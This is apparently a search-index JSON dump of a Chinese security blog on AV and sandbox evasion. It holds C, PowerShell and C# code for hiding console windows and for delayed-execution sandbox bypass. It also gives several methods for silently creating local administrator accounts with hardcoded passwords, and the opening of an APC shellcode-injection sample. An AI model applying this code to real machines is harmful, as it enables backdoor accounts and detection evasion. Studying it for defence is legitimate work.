[{"id":0,"href":"/posts/2026/01/Sql%E6%B3%A8%E5%85%A5/","title":"Sqlæ³¨å…¥","section":"ä»£ç å®¡è®¡","content":" "},{"id":1,"href":"/posts/2026/01/AI-%E5%AE%89%E5%85%A8/","title":"AI å®‰å…¨","section":"AI","content":" "},{"id":2,"href":"/posts/2026/01/%E9%9A%90%E8%97%8F%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%AA%97%E5%8F%A3/","title":"éšè—æ§åˆ¶å°çª—å£","section":"å…æ€\u0026Tip","content":" #pragma comment æŒ‡ä»¤# 1 2 3 4 5 6 7 #pragma comment(linker, \u0026#34;/subsystem:\\\u0026#34;windows\\\u0026#34; /entry:\\\u0026#34;mainCRTStartup\\\u0026#34;\u0026#34;) #include \u0026lt;windows.h\u0026gt; int main() { MessageBoxA(0, \u0026#34;å¼¹çª—ï¼\u0026#34;, \u0026#34;Test\u0026#34;, 0); return 0; } ShowWindow# 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;windows.h\u0026gt; int main() { // è·å–æ§åˆ¶å°çª—å£å¥æŸ„ HWND hWnd = GetConsoleWindow(); // éšè— ShowWindow(hWnd, SW_HIDE); MessageBoxA(0, \u0026#34;å¼¹çª—ï¼\u0026#34;, \u0026#34;Test\u0026#34;, 0); return 0; } FreeConsole# 1 2 3 4 5 6 7 8 9 #include \u0026lt;windows.h\u0026gt; int main() { // é‡Šæ”¾æ§åˆ¶å°èµ„æº FreeConsole(); MessageBoxA(0, \u0026#34;å¼¹çª—ï¼\u0026#34;, \u0026#34;Test\u0026#34;, 0); return 0; } "},{"id":3,"href":"/posts/2026/01/%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C/","title":"å»¶è¿Ÿæ‰§è¡Œ","section":"æ²™ç®±ç»•è¿‡","content":" Sleep()# 1 2 3 4 5 6 7 8 #include \u0026lt;windows.h\u0026gt; int main() { // å•ä½æ˜¯æ¯«ç§’ Sleep(5000); MessageBoxA(NULL, \u0026#34;Hello!\u0026#34;, \u0026#34;Success\u0026#34;, MB_OK); return 0; } WaitForSingleObject# 1 2 3 4 5 6 7 8 9 10 #include \u0026lt;windows.h\u0026gt; int main() { WaitForSingleObject(GetCurrentProcess(), 5000); MessageBoxA(NULL, \u0026#34;5ç§’é’Ÿ\u0026#34;,\u0026#34;test\u0026#34;, MB_OK | MB_ICONINFORMATION); return 0; } IcmpSendEcho# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;iphlpapi.h\u0026gt; #include \u0026lt;icmpapi.h\u0026gt; #include \u0026lt;iostream\u0026gt; #pragma comment(lib, \u0026#34;iphlpapi.lib\u0026#34;) #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) int main() { HANDLE hIcmp = IcmpCreateFile(); // æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„ IP åœ°å€ (ä¾‹å¦‚ 1.1.1.1) IPAddr targetIp = inet_addr(\u0026#34;192.0.2.1\u0026#34;); char sendData[] = \u0026#34;test\u0026#34;; LPVOID replyBuffer = (VOID*)malloc(sizeof(ICMP_ECHO_REPLY) + sizeof(sendData)); // è®¾ç½®è¶…æ—¶æ—¶é—´ä¸º 5000 æ¯«ç§’ IcmpSendEcho(hIcmp, targetIp, sendData, sizeof(sendData), NULL, replyBuffer, sizeof(ICMP_ECHO_REPLY) + sizeof(sendData), 5000); std::cout \u0026lt;\u0026lt; \u0026#34;5 seconds passed.\u0026#34; \u0026lt;\u0026lt; std::endl; free(replyBuffer); IcmpCloseHandle(hIcmp); MessageBoxA(NULL, \u0026#34;5 seconds passed.\u0026#34;, \u0026#34;Info\u0026#34;, MB_OK); return 0; } Select (Socket è¶…æ—¶)# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;iostream\u0026gt; #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) int main() { // 1. åˆå§‹åŒ– WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); // 2. åˆ›å»ºä¸€ä¸ªå ä½ Socket SOCKET dummy = socket(AF_INET, SOCK_STREAM, 0); FD_SET readfds; FD_ZERO(\u0026amp;readfds); FD_SET(dummy, \u0026amp;readfds); // 3. è®¾ç½®æ—¶é—´ TIMEVAL tv; tv.tv_sec = 5; tv.tv_usec = 0; // 4. æ‰§è¡Œå»¶æ—¶ select(0, \u0026amp;readfds, NULL, NULL, \u0026amp;tv); // 5. æ¸…ç† closesocket(dummy); WSACleanup(); std::cout \u0026lt;\u0026lt; \u0026#34;[*] 5 seconds passed.\u0026#34; \u0026lt;\u0026lt; std::endl; MessageBoxA(NULL, \u0026#34;å»¶æ—¶æˆåŠŸï¼\u0026#34;, \u0026#34;Test\u0026#34;, MB_OK); return 0; } "},{"id":4,"href":"/posts/2026/01/Windows%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/","title":"Windowsæ·»åŠ ç”¨æˆ·","section":"å…æ€\u0026Tip","content":" CMD# 1 2 net user admin 123456 /add net localgroup Administrators admin /add Powershell# 1 2 3 $Password = ConvertTo-SecureString \u0026#34;P@ssw0rd123\u0026#34; -AsPlainText -Force New-LocalUser -Name \u0026#34;admin\u0026#34; -Password $Password -Description \u0026#34;Admin User\u0026#34; Add-LocalGroupMember -Group \u0026#34;Administrators\u0026#34; -Member \u0026#34;admin\u0026#34; 1 2 3 4 5 6 7 $computer = [ADSI]\u0026#34;WinNT://$env:COMPUTERNAME\u0026#34; $user = $computer.Create(\u0026#34;User\u0026#34;, \u0026#34;test\u0026#34;) $user.SetPassword(\u0026#34;P@ssw0rd123\u0026#34;) $user.SetInfo() $group = [ADSI]\u0026#34;WinNT://$env:COMPUTERNAME/Administrators,group\u0026#34; $group.Add($user.Path) 1 2 3 4 5 6 7 8 Add-Type -AssemblyName System.DirectoryServices $computer = [ADSI]\u0026#34;WinNT://localhost\u0026#34; $user = $computer.Children.Add(\u0026#34;admin\u0026#34;, \u0026#34;user\u0026#34;) $user.Invoke(\u0026#34;SetPassword\u0026#34;, \u0026#34;P@ssw0rd123\u0026#34;) $user.CommitChanges() $group = [ADSI]\u0026#34;WinNT://localhost/Administrators,group\u0026#34; $group.Invoke(\u0026#34;Add\u0026#34;, $user.Path) NetUserAdd# å‚è€ƒhttps://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #ifndef UNICODE #define UNICODE #endif #pragma comment(lib, \u0026#34;netapi32.lib\u0026#34;) #include \u0026lt;windows.h\u0026gt; #include \u0026lt;lm.h\u0026gt; int wmain() { USER_INFO_1 ui = {0}; ui.usri1_name = (wchar_t*)L\u0026#34;admin\u0026#34;; // ç”¨æˆ·å ui.usri1_password = (wchar_t*)L\u0026#34;P@ssw0rd123!\u0026#34;; // å¯†ç  ui.usri1_priv = USER_PRIV_USER; ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD; //åˆ›å»ºç”¨æˆ· NetUserAdd(NULL, 1, (LPBYTE)\u0026amp;ui, NULL); //æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname = ui.usri1_name; NetLocalGroupAddMembers(NULL, (LPCWSTR)L\u0026#34;Administrators\u0026#34;, 3, (LPBYTE)\u0026amp;account, 1); return 0; } SamAddUser# https://doxygen.reactos.org/d2/d5b/dll_2win32_2netapi32_2user_8c_source.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;wchar.h\u0026gt; #pragma comment(lib, \u0026#34;samlib.lib\u0026#34;) #pragma comment(lib, \u0026#34;advapi32.lib\u0026#34;) typedef PVOID SAM_HANDLE; #ifndef USER_NORMAL_ACCOUNT #define USER_NORMAL_ACCOUNT 0x10 #endif typedef enum _USER_INFORMATION_CLASS { UserGeneralInformation = 1, UserSetPasswordInformation = 15, UserControlInformation = 16, UserInternal1Information = 18 } USER_INFORMATION_CLASS; typedef struct _SAM_USER_SET_PASSWORD_INFORMATION { UNICODE_STRING Password; BOOLEAN PasswordExpired; } SAM_USER_SET_PASSWORD_INFORMATION, *PSAM_USER_SET_PASSWORD_INFORMATION; typedef struct _SAM_USER_CONTROL_INFORMATION { ULONG UserAccountControl; } SAM_USER_CONTROL_INFORMATION, *PSAM_USER_CONTROL_INFORMATION; extern \u0026#34;C\u0026#34; { NTSTATUS NTAPI SamConnect(PUNICODE_STRING ServerName, SAM_HANDLE* ServerHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes); NTSTATUS NTAPI SamOpenDomain(SAM_HANDLE ServerHandle, ACCESS_MASK DesiredAccess, PSID DomainId, SAM_HANDLE* DomainHandle); NTSTATUS NTAPI SamCreateUser2InDomain(SAM_HANDLE DomainHandle, PUNICODE_STRING AccountName, ULONG AccountType, ACCESS_MASK DesiredAccess, SAM_HANDLE* UserHandle, PULONG GrantedAccess, PULONG RelativeId); NTSTATUS NTAPI SamLookupNamesInDomain(SAM_HANDLE DomainHandle, ULONG Count, PUNICODE_STRING Names, PULONG* RelativeIds, PULONG* Use); NTSTATUS NTAPI SamOpenUser(SAM_HANDLE DomainHandle, ACCESS_MASK DesiredAccess, ULONG UserId, SAM_HANDLE* UserHandle); NTSTATUS NTAPI SamSetInformationUser(SAM_HANDLE UserHandle, USER_INFORMATION_CLASS UserInformationClass, PVOID Buffer); NTSTATUS NTAPI SamOpenAlias(SAM_HANDLE DomainHandle, ACCESS_MASK DesiredAccess, ULONG AliasId, SAM_HANDLE* AliasHandle); NTSTATUS NTAPI SamAddMemberToAlias(SAM_HANDLE AliasHandle, PSID MemberId); NTSTATUS NTAPI SamCloseHandle(SAM_HANDLE SamHandle); NTSTATUS NTAPI SamFreeMemory(PVOID Buffer); } void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) { if (SourceString) { DestinationString-\u0026gt;Buffer = (PWSTR)SourceString; DestinationString-\u0026gt;Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR)); DestinationString-\u0026gt;MaximumLength = DestinationString-\u0026gt;Length + sizeof(WCHAR); } else { DestinationString-\u0026gt;Buffer = NULL; DestinationString-\u0026gt;Length = 0; DestinationString-\u0026gt;MaximumLength = 0; } } bool GetAccountDomainSid(PSID* ppSid) { HANDLE token = NULL; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, \u0026amp;token)) { return false; } DWORD tokenSize = 0; GetTokenInformation(token, TokenUser, NULL, 0, \u0026amp;tokenSize); if (tokenSize == 0) { CloseHandle(token); return false; } PTOKEN_USER tokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, tokenSize); if (!tokenUser) { CloseHandle(token); return false; } if (!GetTokenInformation(token, TokenUser, tokenUser, tokenSize, \u0026amp;tokenSize)) { HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } DWORD domainSidSize = 0; GetWindowsAccountDomainSid(tokenUser-\u0026gt;User.Sid, NULL, \u0026amp;domainSidSize); if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || domainSidSize == 0) { HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } PSID domainSid = HeapAlloc(GetProcessHeap(), 0, domainSidSize); if (!domainSid) { HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } if (!GetWindowsAccountDomainSid(tokenUser-\u0026gt;User.Sid, domainSid, \u0026amp;domainSidSize)) { HeapFree(GetProcessHeap(), 0, domainSid); HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } *ppSid = domainSid; HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return true; } int main() { NTSTATUS status; SAM_HANDLE hSam = NULL; SAM_HANDLE hDomain = NULL; SAM_HANDLE hUser = NULL; SAM_HANDLE hBuiltinDomain = NULL; SAM_HANDLE hAlias = NULL; OBJECT_ATTRIBUTES ObjectAttributes = { 0 }; InitializeObjectAttributes(\u0026amp;ObjectAttributes, NULL, 0, NULL, NULL); UNICODE_STRING uUsername; InitUnicodeString(\u0026amp;uUsername, L\u0026#34;Admin\u0026#34;); std::cout \u0026lt;\u0026lt; \u0026#34;[*] Connecting to SAM...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamConnect(NULL, \u0026amp;hSam, MAXIMUM_ALLOWED, \u0026amp;ObjectAttributes); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamConnect failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; return 1; } PSID pAccountSid = NULL; if (!GetAccountDomainSid(\u0026amp;pAccountSid)) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to get Account Domain SID\u0026#34; \u0026lt;\u0026lt; std::endl; SamCloseHandle(hSam); return 1; } std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening Account Domain...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamOpenDomain(hSam, MAXIMUM_ALLOWED, pAccountSid, \u0026amp;hDomain); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamOpenDomain (Account) failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; return 1; } std::cout \u0026lt;\u0026lt; \u0026#34;[*] Creating user \u0026#39;\u0026#39;...\u0026#34; \u0026lt;\u0026lt; std::endl; ULONG grantedAccess; ULONG userRid; status = SamCreateUser2InDomain(hDomain, \u0026amp;uUsername, USER_NORMAL_ACCOUNT, MAXIMUM_ALLOWED, \u0026amp;hUser, \u0026amp;grantedAccess, \u0026amp;userRid); bool hasUserRid = false; if (status == 0xC0000035) { std::cout \u0026lt;\u0026lt; \u0026#34;[!] User already exists. Proceeding to add to group.\u0026#34; \u0026lt;\u0026lt; std::endl; } else if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamCreateUser2InDomain failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; return 1; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] User created. RID: \u0026#34; \u0026lt;\u0026lt; userRid \u0026lt;\u0026lt; std::endl; SamCloseHandle(hUser); hasUserRid = true; } if (!hasUserRid) { PULONG rids = NULL; PULONG uses = NULL; status = SamLookupNamesInDomain(hDomain, 1, \u0026amp;uUsername, \u0026amp;rids, \u0026amp;uses); if (status \u0026lt; 0 || rids == NULL) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamLookupNamesInDomain failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; SamCloseHandle(hDomain); SamCloseHandle(hSam); HeapFree(GetProcessHeap(), 0, pAccountSid); return 1; } userRid = rids[0]; hasUserRid = true; SamFreeMemory(rids); SamFreeMemory(uses); } if (hasUserRid) { // Open user to set password and enable account if (status == 0xC0000035 || status \u0026gt;= 0) { // If created or exists std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening user to set password and enable account...\u0026#34; \u0026lt;\u0026lt; std::endl; // Use userRid to open user status = SamOpenUser(hDomain, MAXIMUM_ALLOWED, userRid, \u0026amp;hUser); if (status \u0026gt;= 0) { // 1. Set Password UNICODE_STRING uPassword; InitUnicodeString(\u0026amp;uPassword, L\u0026#34;Password123!\u0026#34;); SAM_USER_SET_PASSWORD_INFORMATION pwdInfo; pwdInfo.Password = uPassword; pwdInfo.PasswordExpired = FALSE; std::cout \u0026lt;\u0026lt; \u0026#34;[*] Setting password...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamSetInformationUser(hUser, UserSetPasswordInformation, \u0026amp;pwdInfo); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to set password: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] Password set successfully.\u0026#34; \u0026lt;\u0026lt; std::endl; } // 2. Enable Account SAM_USER_CONTROL_INFORMATION controlInfo; controlInfo.UserAccountControl = USER_NORMAL_ACCOUNT | 0x10000; // USER_DONT_EXPIRE_PASSWORD // Ensure we don\u0026#39;t accidentally disable it (UF_ACCOUNTDISABLE is 0x0002) std::cout \u0026lt;\u0026lt; \u0026#34;[*] Enabling account...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamSetInformationUser(hUser, UserControlInformation, \u0026amp;controlInfo); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to enable account: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] Account enabled.\u0026#34; \u0026lt;\u0026lt; std::endl; } SamCloseHandle(hUser); } else { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to open user: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } } UCHAR subAuthCount = *GetSidSubAuthorityCount(pAccountSid); ULONG sidLength = GetSidLengthRequired(subAuthCount + 1); PSID pUserSid = HeapAlloc(GetProcessHeap(), 0, sidLength); InitializeSid(pUserSid, GetSidIdentifierAuthority(pAccountSid), subAuthCount + 1); for (UCHAR i = 0; i \u0026lt; subAuthCount; i++) { *GetSidSubAuthority(pUserSid, i) = *GetSidSubAuthority(pAccountSid, i); } *GetSidSubAuthority(pUserSid, subAuthCount) = userRid; PSID pBuiltinSid = NULL; SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY; AllocateAndInitializeSid(\u0026amp;NtAuthority, 1, SECURITY_BUILTIN_DOMAIN_RID, 0, 0, 0, 0, 0, 0, 0, \u0026amp;pBuiltinSid); std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening Builtin Domain...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamOpenDomain(hSam, MAXIMUM_ALLOWED, pBuiltinSid, \u0026amp;hBuiltinDomain); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamOpenDomain (Builtin) failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening Administrators Alias...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamOpenAlias(hBuiltinDomain, MAXIMUM_ALLOWED, 0x220, \u0026amp;hAlias); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamOpenAlias failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[*] Adding user to Administrators...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamAddMemberToAlias(hAlias, pUserSid); if (status \u0026lt; 0) { if (status == 0xC0000035) std::cout \u0026lt;\u0026lt; \u0026#34;[!] User is already in Administrators group.\u0026#34; \u0026lt;\u0026lt; std::endl; else std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamAddMemberToAlias failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] User successfully added to Administrators group!\u0026#34; \u0026lt;\u0026lt; std::endl; } SamCloseHandle(hAlias); } SamCloseHandle(hBuiltinDomain); } FreeSid(pBuiltinSid); HeapFree(GetProcessHeap(), 0, pUserSid); } SamCloseHandle(hDomain); SamCloseHandle(hSam); HeapFree(GetProcessHeap(), 0, pAccountSid); std::cout \u0026lt;\u0026lt; \u0026#34;Done.\u0026#34; \u0026lt;\u0026lt; std::endl; return 0; } C## 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 using System; using System.DirectoryServices; class Class1 { static void Main(string[] args) { try { string randomStr = new Random().Next(100, 999).ToString(); //string username = \u0026#34;admin\u0026#34; + randomStr + \u0026#34;$\u0026#34;; //string password = \u0026#34;Admin.\u0026#34; + randomStr; string username = \u0026#34;admins\u0026#34;; string password = \u0026#34;Abc.123\u0026#34;; DirectoryEntry AD = new DirectoryEntry(\u0026#34;WinNT://\u0026#34; + Environment.MachineName + \u0026#34;,computer\u0026#34;); DirectoryEntry NewUser = AD.Children.Add(username, \u0026#34;user\u0026#34;); NewUser.Invoke(\u0026#34;SetPassword\u0026#34;, new object[] { password }); NewUser.Invoke(\u0026#34;Put\u0026#34;, new object[] { \u0026#34;Description\u0026#34;, \u0026#34;ç³»ç»Ÿç®¡ç†çš„ç”¨æˆ·å¸æˆ·ã€‚\u0026#34; }); NewUser.CommitChanges(); DirectoryEntry grp; grp = AD.Children.Find(\u0026#34;Administrators\u0026#34;, \u0026#34;group\u0026#34;); if (grp != null) { grp.Invoke(\u0026#34;Add\u0026#34;, new object[] { NewUser.Path.ToString() }); } Console.WriteLine(\u0026#34;æ·»åŠ æˆåŠŸ\u0026#34;); Console.WriteLine(\u0026#34;Userï¼š\u0026#34; + username); Console.WriteLine(\u0026#34;Passwordï¼š\u0026#34; + password); } catch (Exception ex) { Console.WriteLine(ex.Message); } } } "},{"id":5,"href":"/posts/2026/01/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/","title":"PEæ–‡ä»¶ç»“æ„","section":"å…æ€\u0026Tip","content":" "},{"id":6,"href":"/posts/2026/01/Windows-API-%E8%B0%83%E7%94%A8%E5%B1%82%E7%BA%A7/","title":"Windows API è°ƒç”¨å±‚çº§","section":"å…æ€\u0026Tip","content":" ç¬¬ä¸€å±‚ï¼šStandard Library (æ ‡å‡†åº“å±‚)# ä¾‹å¦‚ï¼šCè¯­è¨€ä¸­çš„\n1 FILE* fp = fopen(\u0026#34;test.txt\u0026#34;, \u0026#34;w\u0026#34;); // åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ æˆ–è€…javaä¸­çš„ï¼š\n1 new FileOutputStream(\u0026#34;test.txt\u0026#34;); ç¬¬äºŒå±‚ï¼šWin32 API / Windows Subsystem (å­ç³»ç»Ÿå±‚)# è¿™æ˜¯å¾®è½¯å®˜æ–¹æä¾›ç»™å¼€å‘è€…çš„ä¸€å¥—æ ‡å‡†æ¥å£ï¼Œé€šå¸¸ä½äº Kernel32.dll ã€ User32.dll ç­‰ DLL ä¸­ã€‚ å½“ fopen åœ¨ Windows ä¸Šè¿è¡Œæ—¶ï¼Œå®ƒæœ€ç»ˆä¼šè°ƒç”¨ï¼š\nCreateFileA(\u0026#34;test.txt\u0026#34;, ...); // ä½äº Kernel32.dllç¬¬ä¸‰å±‚ï¼šNative API (åŸç”Ÿ API å±‚)# Kernel32.dll ä¸­çš„ CreateFile ç»è¿‡ä¸€ç³»åˆ—æ£€æŸ¥åï¼Œä¼šè°ƒç”¨æ›´åº•å±‚çš„å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ä½äº Ntdll.dll ä¸­ï¼š\nNtCreateFile(...); // æˆ–è€… ZwCreateFileNtCreateFile çš„æ ¸å¿ƒä»»åŠ¡åªæœ‰ä¸¤ä»¶äº‹ï¼š\næŠŠ ç³»ç»Ÿè°ƒç”¨å· (SSN) æ”¾è¿› EAX å¯„å­˜å™¨ï¼ˆä¾‹å¦‚ Win10 ä¸Šå¯èƒ½æ˜¯ 0x55 ï¼‰ã€‚ æ‰§è¡Œ syscall æŒ‡ä»¤ï¼ˆx64ï¼‰æˆ– sysenter æŒ‡ä»¤ï¼ˆx86ï¼‰ã€‚ ====== è·¨è¶Šè¾¹ç•Œï¼šç”¨æˆ·æ€ (User Mode) -\u0026gt; å†…æ ¸æ€ (Kernel Mode) ======# æ‰§è¡Œ syscall æŒ‡ä»¤åï¼ŒCPU æƒé™ä» Ring 3 åˆ‡æ¢åˆ° Ring 0ã€‚\nç¬¬å››å±‚ï¼šSystem Service Dispatcher (ç³»ç»ŸæœåŠ¡åˆ†å‘å±‚)# CPU åˆ‡æ¢åˆ°å†…æ ¸æ€åï¼Œä¼šè·³è½¬åˆ°å†…æ ¸æ–‡ä»¶ ntoskrnl.exe ä¸­çš„ä¸€ä¸ªç‰¹å®šå¤„ç†å‡½æ•°ï¼ˆé€šå¸¸æ˜¯ KiSystemCall64 ï¼‰ã€‚å®ƒè¯»å– EAX ä¸­çš„å·ç ï¼ˆSSNï¼‰ï¼Œå»æŸ¥ä¸€å¼ è¡¨â€”â€” SSDT (System Service Descriptor Table) ï¼Œæ ¹æ®å·ç æ‰¾åˆ°å¯¹åº”çš„å†…æ ¸å¤„ç†å‡½æ•°åœ°å€ã€‚\nç¬¬äº”å±‚ï¼šKernel Executive (å†…æ ¸æ‰§è¡Œä½“å±‚)# SSDT æŒ‡å‘äº†çœŸæ­£çš„å†…æ ¸å‡½æ•°ï¼š\nNtCreateFile(...); // ä½äº ntoskrnl.exeï¼Œåå­—å’Œ Ntdll é‡Œçš„ä¸€æ ·ï¼Œä½†ä»£ç å®Œå…¨ä¸åŒVisual Studio è°ƒè¯•fopenåº•å±‚API# é…ç½® Visual Studio è°ƒè¯•ç¯å¢ƒ# å»æ‰å‹¾é€‰å¯ç”¨\u0026quot;ä»…æˆ‘çš„ä»£ç \u0026quot; å¯ç”¨ç¬¦å·æœåŠ¡å™¨\nè°ƒè¯• (Debugging) -\u0026gt; ç¬¦å· (Symbols) -\u0026gt; å‹¾é€‰ Microsoft ç¬¦å·æœåŠ¡å™¨ (Microsoft Symbol Servers) ã€‚\n1 2 3 4 5 6 7 8 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; int main() { FILE* fp = fopen(\u0026#34;test.txt\u0026#34;, \u0026#34;w\u0026#34;); // åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ if (fp) fclose(fp); return 0; } å¯ä»¥é…ç½®æ–­ç‚¹å¿«é€Ÿç¡®è®¤ï¼š\nRing 0å±‚VSå°±æ— æ³•çœ‹åˆ°äº†\nåº•å±‚å‡½æ•°åœ¨çº¿æŸ¥è¯¢ç½‘ç«™# ReactOS Documentation â€‹\thttps://doxygen.reactos.org\nUndocumented NT Internals\nhttps://undocumented.ntinternals.net\n"},{"id":7,"href":"/posts/2026/01/APCLocalInjection/","title":"APCLocalInjection","section":"å…æ€\u0026Tip","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #include \u0026lt;windows.h\u0026gt; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char buf[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; 